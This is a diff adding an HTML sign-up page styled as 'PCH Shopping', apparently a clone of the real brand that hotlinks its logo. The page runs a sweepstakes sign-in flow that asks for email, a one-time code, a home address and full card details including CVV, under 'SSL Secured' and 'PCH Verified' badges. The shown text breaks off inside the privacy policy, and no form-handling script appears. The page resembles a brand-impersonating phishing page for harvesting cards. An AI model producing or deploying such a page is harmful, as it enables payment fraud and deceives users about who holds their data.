@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Sign In / Create Account – PCH Shopping</title>
+<link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700;800;900&family=Barlow+Condensed:wght@700;800;900&display=swap" rel="stylesheet"/>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --red: #c8102e; --red-dark: #a00d24;
+  --navy: #002147; --gold: #f5c518; --gold-dark: #e6b800;
+  --blue: #2f54eb; --blue-dark: #1d3fbf;
+  --white: #ffffff; --gray-light: #f4f6fb;
+  --gray-mid: #e5e7eb; --gray: #9ca3af;
+  --text: #111827; --text-mid: #374151; --text-light: #6b7280;
+  --green: #16a34a; --green-light: #f0fdf4;
+  --error: #dc2626; --error-light: #fef2f2;
+  --font: 'Barlow', sans-serif;
+}
+
+body {
+  font-family: var(--font);
+  background: linear-gradient(135deg, #001233 0%, #002d6e 50%, #001233 100%);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 24px 16px;
+  position: relative;
+  overflow-x: hidden;
+}
+
+/* Animated background stars */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image:
+    radial-gradient(1px 1px at 20% 30%, rgba(255,255,255,0.4) 0%, transparent 100%),
+    radial-gradient(1px 1px at 80% 10%, rgba(255,255,255,0.3) 0%, transparent 100%),
+    radial-gradient(1px 1px at 50% 80%, rgba(255,255,255,0.25) 0%, transparent 100%),
+    radial-gradient(2px 2px at 10% 60%, rgba(245,197,24,0.3) 0%, transparent 100%),
+    radial-gradient(2px 2px at 90% 70%, rgba(245,197,24,0.2) 0%, transparent 100%);
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* Back to site link */
+.back-to-site {
+  position: fixed;
+  top: 16px; left: 20px;
+  display: flex; align-items: center; gap: 7px;
+  color: rgba(255,255,255,0.7);
+  font-size: 13px; font-weight: 600;
+  text-decoration: none;
+  z-index: 100;
+  transition: color 0.2s;
+}
+.back-to-site:hover { color: var(--gold); }
+.back-to-site svg { width: 16px; height: 16px; }
+
+/* Main card */
+.login-card {
+  background: var(--white);
+  border-radius: 20px;
+  width: 100%;
+  max-width: 480px;
+  box-shadow: 0 32px 80px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.1);
+  overflow: hidden;
+  position: relative;
+  z-index: 1;
+}
+
+/* Card header bar */
+.card-header {
+  background: linear-gradient(135deg, var(--red) 0%, var(--red-dark) 100%);
+  padding: 22px 28px 18px;
+  text-align: center;
+}
+.card-logo {
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  margin-bottom: 6px;
+}
+.card-logo img { height: 32px; filter: brightness(0) invert(1); }
+.card-logo-text {
+  font-family: 'Barlow Condensed', sans-serif;
+  font-size: 26px; font-weight: 900;
+  color: var(--white); text-transform: uppercase; letter-spacing: 0.04em;
+}
+.card-logo-text span { color: var(--gold); }
+.card-header-sub {
+  font-size: 13px; color: rgba(255,255,255,0.75); font-weight: 500;
+}
+
+/* Card body */
+.card-body { padding: 28px 28px 24px; }
+
+/* Step indicator */
+.step-indicator {
+  display: flex; align-items: center; justify-content: center;
+  gap: 0; margin-bottom: 24px;
+}
+.step-dot {
+  width: 28px; height: 28px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 13px; font-weight: 800;
+  background: var(--gray-mid); color: var(--gray);
+  transition: all 0.3s; flex-shrink: 0;
+}
+.step-dot.active { background: var(--blue); color: var(--white); }
+.step-dot.done { background: var(--green); color: var(--white); }
+.step-dot.done::after { content: "✓"; }
+.step-dot.done span { display: none; }
+.step-line { height: 2px; width: 36px; background: var(--gray-mid); transition: background 0.3s; }
+.step-line.done { background: var(--green); }
+.step-label {
+  font-size: 10px; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.08em; color: var(--text-light); margin-top: 4px; text-align: center;
+}
+
+/* Section title */
+.step-title { font-size: 22px; font-weight: 800; color: var(--navy); margin-bottom: 4px; }
+.step-sub { font-size: 14px; color: var(--text-light); margin-bottom: 20px; line-height: 1.5; }
+
+/* Form elements */
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 14px; }
+.form-row.single { grid-template-columns: 1fr; }
+.form-row.thirds { grid-template-columns: 2fr 1fr 1fr; }
+
+.field { display: flex; flex-direction: column; gap: 5px; }
+.field label {
+  font-size: 12px; font-weight: 700; text-transform: uppercase;
+  letter-spacing: 0.07em; color: var(--text-mid);
+}
+.field input, .field select {
+  padding: 12px 14px;
+  border: 1.5px solid var(--gray-mid);
+  border-radius: 8px;
+  font-size: 15px; font-family: var(--font);
+  color: var(--text); background: var(--white);
+  outline: none; transition: border-color 0.2s, box-shadow 0.2s;
+  width: 100%;
+}
+.field input:focus, .field select:focus {
+  border-color: var(--blue);
+  box-shadow: 0 0 0 3px rgba(47,84,235,0.12);
+}
+.field input.error { border-color: var(--error); background: var(--error-light); }
+.field input::placeholder { color: var(--gray); }
+.field-error { font-size: 11.5px; color: var(--error); font-weight: 600; display: none; }
+.field-error.show { display: block; }
+
+/* Card fields with icons */
+.card-field-wrap { position: relative; }
+.card-field-wrap input { padding-left: 44px; }
+.card-field-icon {
+  position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+  font-size: 20px; pointer-events: none;
+}
+.card-type-badge {
+  position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+  font-size: 12px; font-weight: 800; padding: 2px 8px; border-radius: 4px;
+  background: var(--navy); color: var(--white);
+}
+
+/* Divider */
+.divider {
+  display: flex; align-items: center; gap: 12px; margin: 16px 0;
+}
+.divider-line { flex: 1; height: 1px; background: var(--gray-mid); }
+.divider-text { font-size: 13px; color: var(--gray); font-weight: 500; }
+
+/* Buttons */
+.btn-primary {
+  width: 100%; padding: 14px;
+  background: var(--blue); color: var(--white);
+  border: none; border-radius: 10px;
+  font-size: 15px; font-weight: 800; font-family: var(--font);
+  letter-spacing: 0.04em; cursor: pointer;
+  transition: background 0.2s, transform 0.15s;
+  margin-top: 6px;
+}
+.btn-primary:hover { background: var(--blue-dark); transform: translateY(-1px); }
+.btn-primary.red { background: var(--red); }
+.btn-primary.red:hover { background: var(--red-dark); }
+.btn-primary.gold { background: var(--gold); color: var(--navy); }
+.btn-primary.gold:hover { background: var(--gold-dark); }
+
+.btn-shop {
+  width: 100%; padding: 13px;
+  background: #6c3fc5; color: var(--white);
+  border: none; border-radius: 10px;
+  font-size: 15px; font-weight: 700; font-family: var(--font);
+  cursor: pointer; margin-bottom: 14px;
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  transition: background 0.2s;
+}
+.btn-shop:hover { background: #5a32a3; }
+
+.btn-back {
+  display: flex; align-items: center; gap: 6px;
+  background: none; border: none; color: var(--text-light);
+  font-size: 13px; font-family: var(--font); cursor: pointer;
+  padding: 0; margin-bottom: 18px; font-weight: 600;
+  transition: color 0.15s;
+}
+.btn-back:hover { color: var(--text); }
+
+/* Checkbox row */
+.check-row { display: flex; align-items: flex-start; gap: 10px; margin: 14px 0; }
+.check-row input[type=checkbox] { width: 17px; height: 17px; accent-color: var(--blue); cursor: pointer; flex-shrink: 0; margin-top: 1px; }
+.check-row label { font-size: 13.5px; color: var(--text-mid); cursor: pointer; line-height: 1.5; }
+
+/* TOS + Privacy */
+.tos-text { font-size: 12px; color: var(--text-light); text-align: center; line-height: 1.6; }
+.tos-text a { color: var(--blue); text-decoration: underline; cursor: pointer; }
+
+/* OTP boxes */
+.otp-wrap { display: flex; gap: 8px; justify-content: center; margin: 6px 0 14px; }
+.otp-box {
+  width: 48px; height: 56px;
+  border: 1.5px solid var(--gray-mid); border-radius: 10px;
+  font-size: 24px; font-weight: 800; text-align: center;
+  font-family: var(--font); color: var(--navy); outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.otp-box:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(47,84,235,0.12); }
+.otp-box.filled { border-color: var(--blue); background: #f0f4ff; }
+.otp-box.error-box { border-color: var(--error); background: var(--error-light); }
+
+/* Code hint box */
+.code-hint {
+  background: #f0f4ff; border: 1.5px solid #c7d4fb; border-radius: 10px;
+  padding: 14px 16px; text-align: center; margin-bottom: 14px;
+}
+.code-hint p { font-size: 11px; color: var(--text-light); margin-bottom: 4px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.06em; }
+.code-hint .code { font-size: 28px; font-weight: 900; letter-spacing: 12px; color: var(--navy); font-family: 'Barlow Condensed', sans-serif; }
+
+/* Toast */
+.toast {
+  display: none; align-items: center; gap: 10px;
+  border-radius: 8px; padding: 12px 14px; margin-bottom: 14px;
+  font-size: 13.5px;
+}
+.toast.warning { background: #fff3cd; border: 1px solid #ffc107; color: #856404; display: flex; }
+.toast.danger { background: var(--error-light); border: 1px solid #fca5a5; color: var(--error); display: flex; }
+.toast.success { background: var(--green-light); border: 1px solid #86efac; color: #15803d; display: flex; }
+.toast.hide { display: none !important; }
+
+/* Security badges */
+.security-row {
+  display: flex; justify-content: center; gap: 20px; flex-wrap: wrap;
+  margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--gray-mid);
+}
+.sec-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-light); font-weight: 600; }
+.sec-badge span { font-size: 16px; }
+
+/* Success screen */
+.success-screen { text-align: center; padding: 16px 0 8px; }
+.success-icon { font-size: 72px; margin-bottom: 16px; animation: pop 0.5s cubic-bezier(0.34,1.56,0.64,1); }
+@keyframes pop { from { transform: scale(0); } to { transform: scale(1); } }
+.success-screen h2 { font-family: 'Barlow Condensed', sans-serif; font-size: 36px; font-weight: 900; text-transform: uppercase; color: var(--navy); margin-bottom: 8px; }
+.success-screen p { font-size: 15px; color: var(--text-light); margin-bottom: 24px; line-height: 1.6; max-width: 320px; margin-left: auto; margin-right: auto; }
+.success-entries { display: inline-flex; align-items: center; gap: 8px; background: var(--navy); color: var(--gold); font-size: 14px; font-weight: 700; padding: 10px 20px; border-radius: 8px; margin-bottom: 20px; }
+
+/* Card section divider */
+.section-divider {
+  display: flex; align-items: center; gap: 10px;
+  margin: 20px 0 16px;
+}
+.section-divider .sd-line { flex: 1; height: 1px; background: var(--gray-mid); }
+.section-divider .sd-label {
+  font-size: 11px; font-weight: 800; text-transform: uppercase;
+  letter-spacing: 0.1em; color: var(--text-light);
+  background: var(--white); padding: 0 8px;
+}
+
+/* Card accepted icons */
+.cards-accepted {
+  display: flex; align-items: center; gap: 8px; margin-top: 8px;
+}
+.card-icon {
+  padding: 3px 8px; border: 1px solid var(--gray-mid); border-radius: 4px;
+  font-size: 11px; font-weight: 800; color: var(--text-mid); background: var(--white);
+}
+.card-icon.visa { color: #1a1f71; }
+.card-icon.mc { color: #eb001b; }
+.card-icon.amex { color: #007bc1; }
+.card-icon.discover { color: #ff6600; }
+
+/* Modals */
+.modal-overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(0,0,0,0.55); z-index: 1000;
+  align-items: center; justify-content: center; padding: 16px;
+}
+.modal-overlay.open { display: flex; }
+.modal-box {
+  background: var(--white); border-radius: 16px;
+  width: 100%; max-width: 560px; max-height: 80vh;
+  display: flex; flex-direction: column; overflow: hidden;
+  box-shadow: 0 32px 80px rgba(0,0,0,0.4);
+}
+.modal-header {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 18px 22px; border-bottom: 1px solid var(--gray-mid); flex-shrink: 0;
+}
+.modal-header h2 { font-size: 17px; font-weight: 800; color: var(--navy); }
+.modal-close { background: none; border: none; cursor: pointer; font-size: 22px; color: var(--gray); padding: 2px 8px; border-radius: 6px; }
+.modal-close:hover { background: var(--gray-mid); }
+.modal-body { overflow-y: auto; padding: 22px; flex: 1; }
+.modal-body h3 { font-size: 14px; font-weight: 700; color: var(--navy); margin: 18px 0 6px; }
+.modal-body h3:first-child { margin-top: 0; }
+.modal-body p, .modal-body li { font-size: 13px; color: var(--text-mid); line-height: 1.75; }
+.modal-body ul { padding-left: 18px; margin-bottom: 10px; }
+.modal-footer { padding: 14px 22px; border-top: 1px solid var(--gray-mid); flex-shrink: 0; }
+.modal-footer button { width: 100%; padding: 12px; background: var(--blue); color: var(--white); border: none; border-radius: 8px; font-size: 14px; font-weight: 700; font-family: var(--font); cursor: pointer; }
+.modal-footer button:hover { background: var(--blue-dark); }
+
+/* Responsive */
+@media (max-width: 500px) {
+  .card-body { padding: 22px 18px 20px; }
+  .form-row { grid-template-columns: 1fr; }
+  .form-row.thirds { grid-template-columns: 1fr 1fr; }
+  .otp-box { width: 40px; height: 48px; font-size: 20px; }
+}
+</style>
+</head>
+<body>
+
+<a href="start.html" class="back-to-site">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+  Back to PCH Shopping
+</a>
+
+<div class="login-card">
+
+  <!-- Header -->
+  <div class="card-header">
+    <div class="card-logo">
+      <img src="https://www.pchshopping.com/cdn/shop/files/PCH_icon--NoReg-white.png?height=64&v=1764867299" alt="PCH"/>
+      <div class="card-logo-text">PCH <span>Shopping</span></div>
+    </div>
+    <div class="card-header-sub">America's Favorite Sweepstakes — Shop, Enter & Win!</div>
+  </div>
+
+  <div class="card-body">
+
+    <!-- ══════════════════════════════
+         STEP 1 — EMAIL
+    ══════════════════════════════ -->
+    <div id="step-email">
+
+      <!-- Step indicator -->
+      <div style="margin-bottom:22px">
+        <div class="step-indicator">
+          <div class="step-dot active"><span>1</span></div>
+          <div class="step-line"></div>
+          <div class="step-dot"><span>2</span></div>
+          <div class="step-line"></div>
+          <div class="step-dot"><span>3</span></div>
+          <div class="step-line"></div>
+          <div class="step-dot"><span>4</span></div>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-top:5px;padding:0 2px">
+          <span class="step-label" style="color:var(--blue)">Email</span>
+          <span class="step-label">Verify</span>
+          <span class="step-label">Profile</span>
+          <span class="step-label">Payment</span>
+        </div>
+      </div>
+
+      <p class="step-title">Sign In or Join</p>
+      <p class="step-sub">Sign in to your account or create a new one — it only takes a minute!</p>
+
+      <button class="btn-shop" onclick="showUnavailable()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg>
+        Continue with Shop
+      </button>
+
+      <div id="unavailableToast" class="toast warning hide">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#856404" stroke-width="2" stroke-linecap="round" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        Sorry, this option is currently unavailable. Please use email.
+      </div>
+
+      <div class="divider"><div class="divider-line"></div><span class="divider-text">or continue with email</span><div class="divider-line"></div></div>
+
+      <div class="field form-row single">
+        <label for="emailInput">Email Address</label>
+        <input type="email" id="emailInput" placeholder="you@example.com" autocomplete="email" onkeydown="if(event.key==='Enter')handleContinue()"/>
+        <div class="field-error" id="emailError">Please enter a valid email address.</div>
+      </div>
+
+      <div class="check-row">
+        <input type="checkbox" id="newsCheck" checked/>
+        <label for="newsCheck">Email me with news, exclusive offers &amp; prize alerts</label>
+      </div>
+
+      <button class="btn-primary" onclick="handleContinue()">Continue →</button>
+
+      <div style="margin-top:14px">
+        <p class="tos-text">By continuing, you agree to our <a onclick="openModal('tosModal')">Terms of Service</a> and <a onclick="openModal('ppModal')">Privacy Policy</a></p>
+      </div>
+
+      <div class="security-row">
+        <div class="sec-badge"><span>🔒</span> SSL Secured</div>
+        <div class="sec-badge"><span>🛡️</span> Data Protected</div>
+        <div class="sec-badge"><span>🏆</span> PCH Verified</div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════
+         STEP 2 — OTP VERIFY
+    ══════════════════════════════ -->
+    <div id="step-otp" style="display:none">
+
+      <div style="margin-bottom:22px">
+        <div class="step-indicator">
+          <div class="step-dot done"><span>1</span></div>
+          <div class="step-line done"></div>
+          <div class="step-dot active"><span>2</span></div>
+          <div class="step-line"></div>
+          <div class="step-dot"><span>3</span></div>
+          <div class="step-line"></div>
+          <div class="step-dot"><span>4</span></div>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-top:5px;padding:0 2px">
+          <span class="step-label">Email</span>
+          <span class="step-label" style="color:var(--blue)">Verify</span>
+          <span class="step-label">Profile</span>
+          <span class="step-label">Payment</span>
+        </div>
+      </div>
+
+      <button class="btn-back" onclick="goBack('step-email')">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+        Back
+      </button>
+
+      <p class="step-title">Check Your Email</p>
+      <p class="step-sub">We sent a 6-digit code to<br><strong id="emailDisplay" style="color:var(--navy)"></strong></p>
+
+      <div class="otp-wrap">
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o1"/>
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o2"/>
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o3"/>
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o4"/>
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o5"/>
+        <input class="otp-box" type="text" inputmode="numeric" maxlength="1" id="o6"/>
+      </div>
+
+      <div class="field-error" id="otpError" style="text-align:center;margin-bottom:10px"></div>
+
+      <div class="code-hint">
+        <p>Your verification code (demo mode)</p>
+        <div class="code" id="codeHint"></div>
+      </div>
+
+      <button class="btn-primary" onclick="verifyOtp()">Verify Code →</button>
+
+      <p style="font-size:13px;color:var(--text-light);text-align:center;margin-top:14px">
+        Didn't get a code? <a id="resendLink" onclick="resendCode()" style="color:var(--blue);text-decoration:underline;cursor:pointer;font-weight:700">Resend</a>
+      </p>
+    </div>
+
+    <!-- ══════════════════════════════
+         STEP 3 — PROFILE
+    ══════════════════════════════ -->
+    <div id="step-profile" style="display:none">
+
+      <div style="margin-bottom:22px">
+        <div class="step-indicator">
+          <div class="step-dot done"><span>1</span></div>
+          <div class="step-line done"></div>
+          <div class="step-dot done"><span>2</span></div>
+          <div class="step-line done"></div>
+          <div class="step-dot active"><span>3</span></div>
+          <div class="step-line"></div>
+          <div class="step-dot"><span>4</span></div>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-top:5px;padding:0 2px">
+          <span class="step-label">Email</span>
+          <span class="step-label">Verify</span>
+          <span class="step-label" style="color:var(--blue)">Profile</span>
+          <span class="step-label">Payment</span>
+        </div>
+      </div>
+
+      <p class="step-title">Your Profile</p>
+      <p class="step-sub">Required to verify your identity and ship your prizes!</p>
+
+      <div class="form-row">
+        <div class="field">
+          <label>First Name *</label>
+          <input type="text" id="firstName" placeholder="Jane" autocomplete="given-name"/>
+          <div class="field-error" id="firstNameError">Required</div>
+        </div>
+        <div class="field">
+          <label>Last Name *</label>
+          <input type="text" id="lastName" placeholder="Smith" autocomplete="family-name"/>
+          <div class="field-error" id="lastNameError">Required</div>
+        </div>
+      </div>
+
+      <div class="form-row single" style="margin-bottom:14px">
+        <div class="field">
+          <label>Phone Number</label>
+          <input type="tel" id="phone" placeholder="(555) 000-0000" autocomplete="tel"/>
+        </div>
+      </div>
+
+      <div class="section-divider">
+        <div class="sd-line"></div>
+        <div class="sd-label">📍 Mailing Address</div>
+        <div class="sd-line"></div>
+      </div>
+
+      <div class="form-row single" style="margin-bottom:14px">
+        <div class="field">
+          <label>Street Address *</label>
+          <input type="text" id="address1" placeholder="123 Main Street" autocomplete="address-line1"/>
+          <div class="field-error" id="address1Error">Required</div>
+        </div>
+      </div>
+
+      <div class="form-row single" style="margin-bottom:14px">
+        <div class="field">
+          <label>Apt / Suite / Unit</label>
+          <input type="text" id="address2" placeholder="Apt 4B (optional)" autocomplete="address-line2"/>
+        </div>
+      </div>
+
+      <div class="form-row thirds" style="margin-bottom:14px">
+        <div class="field">
+          <label>City *</label>
+          <input type="text" id="city" placeholder="New York" autocomplete="address-level2"/>
+          <div class="field-error" id="cityError">Required</div>
+        </div>
+        <div class="field">
+          <label>State *</label>
+          <select id="state" autocomplete="address-level1">
+            <option value="">State</option>
+            <option>AL</option><option>AK</option><option>AZ</option><option>AR</option>
+            <option>CA</option><option>CO</option><option>CT</option><option>DE</option>
+            <option>FL</option><option>GA</option><option>HI</option><option>ID</option>
+            <option>IL</option><option>IN</option><option>IA</option><option>KS</option>
+            <option>KY</option><option>LA</option><option>ME</option><option>MD</option>
+            <option>MA</option><option>MI</option><option>MN</option><option>MS</option>
+            <option>MO</option><option>MT</option><option>NE</option><option>NV</option>
+            <option>NH</option><option>NJ</option><option>NM</option><option>NY</option>
+            <option>NC</option><option>ND</option><option>OH</option><option>OK</option>
+            <option>OR</option><option>PA</option><option>RI</option><option>SC</option>
+            <option>SD</option><option>TN</option><option>TX</option><option>UT</option>
+            <option>VT</option><option>VA</option><option>WA</option><option>WV</option>
+            <option>WI</option><option>WY</option>
+          </select>
+          <div class="field-error" id="stateError">Required</div>
+        </div>
+        <div class="field">
+          <label>ZIP Code *</label>
+          <input type="text" id="zipCode" placeholder="10001" maxlength="10" autocomplete="postal-code" inputmode="numeric"/>
+          <div class="field-error" id="zipError">Invalid ZIP</div>
+        </div>
+      </div>
+
+      <button class="btn-primary" onclick="submitProfile()">Continue to Payment →</button>
+    </div>
+
+    <!-- ══════════════════════════════
+         STEP 4 — PAYMENT
+    ══════════════════════════════ -->
+    <div id="step-payment" style="display:none">
+
+      <div style="margin-bottom:22px">
+        <div class="step-indicator">
+          <div class="step-dot done"><span>1</span></div>
+          <div class="step-line done"></div>
+          <div class="step-dot done"><span>2</span></div>
+          <div class="step-line done"></div>
+          <div class="step-dot done"><span>3</span></div>
+          <div class="step-line done"></div>
+          <div class="step-dot active"><span>4</span></div>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-top:5px;padding:0 2px">
+          <span class="step-label">Email</span>
+          <span class="step-label">Verify</span>
+          <span class="step-label">Profile</span>
+          <span class="step-label" style="color:var(--blue)">Payment</span>
+        </div>
+      </div>
+
+      <button class="btn-back" onclick="goBack('step-profile')">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+        Back
+      </button>
+
+      <p class="step-title">Payment Information</p>
+      <p class="step-sub">Your card is used for membership billing &amp; purchases. SSL encrypted — we never store raw card data.</p>
+
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px">
+        <div class="cards-accepted">
+          <div class="card-icon visa">VISA</div>
+          <div class="card-icon mc">MC</div>
+          <div class="card-icon amex">AMEX</div>
+          <div class="card-icon discover">DISC</div>
+        </div>
+        <div class="sec-badge"><span>🔒</span> SSL Encrypted</div>
+      </div>
+
+      <div class="form-row single" style="margin-bottom:14px">
+        <div class="field">
+          <label>Name on Card *</label>
+          <input type="text" id="cardName" placeholder="Jane Smith" autocomplete="cc-name"/>
+          <div class="field-error" id="cardNameError">Required</div>
+        </div>
+      </div>
+
+      <div class="form-row single" style="margin-bottom:14px">
+        <div class="field">
+          <label>Card Number *</label>
+          <div class="card-field-wrap">
+            <span class="card-field-icon">💳</span>
+            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" inputmode="numeric" oninput="formatCard(this)"/>
+            <span class="card-type-badge" id="cardTypeBadge" style="display:none"></span>
+          </div>
+          <div class="field-error" id="cardNumberError">Enter a valid 16-digit card number</div>
+        </div>
+      </div>
+
+      <div class="form-row" style="margin-bottom:14px">
+        <div class="field">
+          <label>Expiry Date *</label>
+          <input type="text" id="cardExpiry" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp" inputmode="numeric" oninput="formatExpiry(this)"/>
+          <div class="field-error" id="cardExpiryError">Invalid expiry date</div>
+        </div>
+        <div class="field">
+          <label>CVV / CVC *</label>
+          <div class="card-field-wrap">
+            <span class="card-field-icon">🔑</span>
+            <input type="text" id="cardCvv" placeholder="123" maxlength="4" autocomplete="cc-csc" inputmode="numeric"/>
+          </div>
+          <div class="field-error" id="cardCvvError">Required (3–4 digits)</div>
+        </div>
+      </div>
+
+      <div class="section-divider">
+        <div class="sd-line"></div>
+        <div class="sd-label">Billing Address</div>
+        <div class="sd-line"></div>
+      </div>
+
+      <div class="check-row" style="margin-bottom:14px">
+        <input type="checkbox" id="sameBilling" checked onchange="toggleBillingAddress(this)"/>
+        <label for="sameBilling">Same as mailing address</label>
+      </div>
+
+      <div id="billingAddressFields" style="display:none">
+        <div class="form-row single" style="margin-bottom:12px">
+          <div class="field">
+            <label>Billing Street Address</label>
+            <input type="text" id="billAddress" placeholder="123 Billing St" autocomplete="billing street-address"/>
+          </div>
+        </div>
+        <div class="form-row thirds" style="margin-bottom:12px">
+          <div class="field">
+            <label>City</label>
+            <input type="text" id="billCity" placeholder="New York"/>
+          </div>
+          <div class="field">
+            <label>State</label>
+            <select id="billState">
+              <option value="">State</option>
+              <option>AL</option><option>AK</option><option>AZ</option><option>CA</option>
+              <option>CO</option><option>FL</option><option>GA</option><option>IL</option>
+              <option>NY</option><option>TX</option><option>WA</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>ZIP Code</label>
+            <input type="text" id="billZip" placeholder="10001" maxlength="10" inputmode="numeric"/>
+          </div>
+        </div>
+      </div>
+
+      <div class="check-row">
+        <input type="checkbox" id="saveCard" checked/>
+        <label for="saveCard">Save card for future purchases &amp; faster checkout</label>
+      </div>
+
+      <div style="background:var(--gray-light);border-radius:10px;padding:14px 16px;margin:14px 0;font-size:12px;color:var(--text-light);line-height:1.6">
+        🔒 Your payment information is encrypted with 256-bit SSL. PCH Shopping never stores your raw card number — it is securely tokenized via our payment processor.
+      </div>
+
+      <button class="btn-primary gold" onclick="submitPayment()">🏆 Complete Setup &amp; Start Winning!</button>
+
+      <p class="tos-text" style="margin-top:12px">
+        By completing setup you authorize PCH Shopping to charge your card for any purchases or memberships you select. <a onclick="openModal('tosModal')">Full terms →</a>
+      </p>
+    </div>
+
+    <!-- ══════════════════════════════
+         STEP 5 — SUCCESS
+    ══════════════════════════════ -->
+    <div id="step-success" style="display:none">
+      <div class="success-screen">
+        <div class="success-icon">🎉</div>
+        <h2>You're In!</h2>
+        <p>Your PCH Shopping account is all set. You've been entered into all active giveaways — good luck!</p>
+        <div class="success-entries">🎟️ <span id="welcomeEntries">500 Bonus Entries</span> Added to Your Account!</div>
+        <a href="start.html" class="btn-primary" style="display:block;text-decoration:none;text-align:center;margin-bottom:10px">🏠 Go to Homepage</a>
+        <a href="shop.html" class="btn-primary red" style="display:block;text-decoration:none;text-align:center;margin-bottom:10px">🛒 Start Shopping &amp; Earn Entries</a>
+        <a href="start.html#spin-the-wheel" class="btn-primary gold" style="display:block;text-decoration:none;text-align:center">🎡 Spin the Wheel Now!</a>
+      </div>
+    </div>
+
+  </div><!-- /card-body -->
+</div><!-- /login-card -->
+
+<!-- ══════ TERMS OF SERVICE MODAL ══════ -->
+<div class="modal-overlay" id="tosModal" onclick="handleOverlay(event,'tosModal')">
+  <div class="modal-box">
+    <div class="modal-header">
+      <h2>Terms of Service</h2>
+      <button class="modal-close" onclick="closeModal('tosModal')">✕</button>
+    </div>
+    <div class="modal-body">
+      <p class="updated">Last updated: May 1, 2026</p>
+      <h3>1. Acceptance of Terms</h3>
+      <p>By creating an account and using PCH Shopping, you agree to these Terms of Service. If you do not agree, please do not use our service.</p>
+      <h3>2. Eligibility</h3>
+      <p>You must be at least 21 years of age and a legal resident of the United States to participate in PCH Shopping giveaways. Accounts are for personal use only.</p>
+      <h3>3. Sweepstakes Rules</h3>
+      <p>No purchase necessary to enter or win. A purchase does not improve your odds of winning. All giveaways are governed by their Official Rules, available on each giveaway page.</p>
+      <h3>4. Memberships &amp; Billing</h3>
+      <p>Monthly memberships are billed on a recurring basis. You may cancel at any time. Cancellation takes effect at the end of the current billing period. No refunds are issued for partial months.</p>
+      <h3>5. Privacy</h3>
+      <p>We collect and use your personal information as described in our Privacy Policy. We do not sell your personal data to third parties.</p>
+      <h3>6. Account Security</h3>
+      <p>You are responsible for maintaining the confidentiality of your account credentials. Notify us immediately of any unauthorized use.</p>
+    </div>
+    <div class="modal-footer"><button onclick="closeModal('tosModal')">I Understand</button></div>
+  </div>
+</div>
+
+<!-- ══════ PRIVACY POLICY MODAL ══════ -->
+<div class="modal-overlay" id="ppModal" onclick="handleOverlay(event,'ppModal')">
+  <div class="modal-box">
+    <div class="modal-header">
+      <h2>Privacy Policy</h2>
+      <button class="modal-close" onclick="closeModal('ppModal')">✕</button>
+    </div>
+    <div class="modal-body">
+      <p class="updated">Last updated: May 1, 2026</p>
+      <h3>Information We Collect</h3>
+      <ul>
+        <li>Name, email address, mailing address, and phone number</li>
+        <li>Payment information (securely tokenized — never stored raw)</li>
+        <li>Browsing and purchase activity on PCH Shopping</li>
+        <li>Device and browser information for security purposes</li>
+      </ul>
+      <h3>How We Use Your Information</h3>
+      <ul>
+        <li>To process orders and deliver products</li>
+        <li>To manage sweepstakes entries and notify winners</li>
+        <li>To send promotional emails (if opted in)</li>
+        <li>To prevent fraud and ensure platform security</li>
+      </ul>
+      <h3>Data Sharing</h3>
